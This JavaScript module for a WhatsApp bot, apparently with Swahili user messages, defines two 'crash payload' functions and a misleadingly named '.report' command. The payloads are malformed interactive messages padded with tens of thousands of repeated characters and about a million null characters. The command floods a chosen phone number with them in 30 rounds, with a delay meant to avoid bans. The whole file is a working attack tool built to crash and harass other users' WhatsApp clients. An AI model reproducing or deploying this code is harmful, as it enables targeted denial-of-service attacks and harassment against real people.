const { isSudo } = require('../lib/index');
const isAdmin = require('../lib/isAdmin');

// ============ REAL CRASH PAYLOADS ============
async function bug1(sock, targetJid) {
    try {
        await sock.relayMessage(
            targetJid,
            {
                ephemeralMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc",
                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                    fileLength: "9999999999999",
                                    pageCount: 1316134911,
                                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                    fileName: "Document",
                                    fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                    directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc",
                                    mediaKeyTimestamp: "1726867151",
                                    contactVcard: true,
                                    jpegThumbnail: "BASE64_ENCODED_THUMBNAIL_HERE"
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: `⿻Senku love you\n${"ꦾ".repeat(29000)}\n\n`
                            },
                            nativeFlowMessage: {
                                nativeFlowMessage: {
                                    name: 'galaxy_message',
                                    paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zyntzy.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                                    version: 3
                                },
                            },
                            contextInfo: {
                                mentionedJid: ["6289526156543@s.whatsapp.net"],
                                forwardingScore: 1,
                                isForwarded: true,
                                fromMe: false,
                                participant: "0@s.whatsapp.net",
                                remoteJid: "status@broadcast",
                                quotedMessage: {
                                    documentMessage: {
                                        url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc",
                                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                        fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                        fileLength: "9999999999999",
                                        pageCount: 1316134911,
                                        mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                        fileName: `Dev Senku`,
                                        fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                        directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc",
                                        mediaKeyTimestamp: "1724474503",
                                        contactVcard: true,
                                        jpegThumbnail: "BASE64_ENCODED_THUMBNAIL_HERE"
                                    }
                                }
                            }
                        }
                    }
                }
            },
            { participant: { jid: targetJid } }
        );
    } catch (error) {
        console.error("Bug1 payload missing execution:", error.message);
    }
}

async function bug2(sock, targetJid) {
    try {
        await sock.relayMessage(
            targetJid, 
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "Damn I am in love with you......",
                                format: "EXTENSIONS_1"
                            },
                            nativeFlowResponseMessage: {
                                name: 'galaxy_message',
                                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zyntzy.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                                version: 3
                            }
                        }
                    }
                }
            }, 
            { participant: { jid: targetJid } }
        );
    } catch (error) {
        console.error("Bug2 payload missing execution:", error.message);
    }
}

// ============ REAL EXECUTION COMMAND ============
async function reportCommand(sock, chatId, message, phoneNumber) {
    try {
        if (!sock || !chatId || !message) return;

        const isGroup = chatId.endsWith('@g.us');
        const senderId = message.key.participant || message.key.remoteJid;

        // Authorization checks
        if (isGroup) {
            const adminStatus = await Promise.race([
                isAdmin(sock, chatId, senderId),
                new Promise((_, r) => setTimeout(() => r(new Error('Timeout')), 4000))
            ]).catch(() => null);
            
            if (!adminStatus) return;
            if (!adminStatus.isBotAdmin) return sock.sendMessage(chatId, { text: '❌ Bot lazima iwe admin.' }, { quoted: message });
            if (!adminStatus.isSenderAdmin && !message.key.fromMe) return sock.sendMessage(chatId, { text: '❌ Admins pekee.' }, { quoted: message });
        } else {
            const senderIsSudo = await isSudo(senderId).catch(() => false);
            if (!message.key.fromMe && !senderIsSudo) return sock.sendMessage(chatId, { text: '❌ Owner/Sudo pekee.' }, { quoted: message });
        }

        // Parse number
        if (!phoneNumber || typeof phoneNumber !== 'string') {
            return sock.sendMessage(chatId, { text: '❌ Weka namba! Mfano: _.report 255XXXXXX_' }, { quoted: message });
        }

        phoneNumber = phoneNumber.trim().replace(/[^0-9]/g, '');
        if (phoneNumber.length < 6) return sock.sendMessage(chatId, { text: '❌ Namba haijakamilika.' }, { quoted: message });

        const botNumber = sock.user?.id?.split(':')[0] || '';
        if (phoneNumber === botNumber) return sock.sendMessage(chatId, { text: '❌ Huwezi kujishambulia mwenyewe.' }, { quoted: message });

        const targetJid = `${phoneNumber}@s.whatsapp.net`;

        // Notification: Real attack has begun
        await sock.sendMessage(chatId, { text: `🚀 *Attacking Target:* ${phoneNumber}\n⚡ Sending 30 rounds of real crash payloads...` }, { quoted: message });

        // Loop execution (Real-time flooding)
        for (let i = 1; i <= 30; i++) {
            // Promise.all inatupa bug zote tatu kwa mpigo bila kusubiri (Real Flooding)
            await Promise.all([
                bug2(sock, targetJid),
                bug1(sock, targetJid),
                bug1(sock, targetJid)
            ]);

            if (i % 10 === 0) {
                await sock.sendMessage(chatId, { text: `⚔️ *Sent:* ${i}/30 crash bundles.` }).catch(() => {});
            }

            // Anti-ban short delay (Muda mfupi kuzuia WhatsApp isikufungie namba yako)
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        // Final feedback
        return await sock.sendMessage(chatId, { 
            text: `🎯 *Execution Success!*\n📱 Target: ${phoneNumber}\n💥 Zote 30 zimeenda halisi na zimekuwa relayed kwenye server.` 
        }, { quoted: message });

    } catch (error) {
        console.error('❌ [EXECUTION ERROR]:', error.message);
        try {
            await sock.sendMessage(chatId, { text: `❌ *Failed:* ${error.message}` }, { quoted: message });
        } catch (err) {}
    }
}

module.exports = reportCommand;
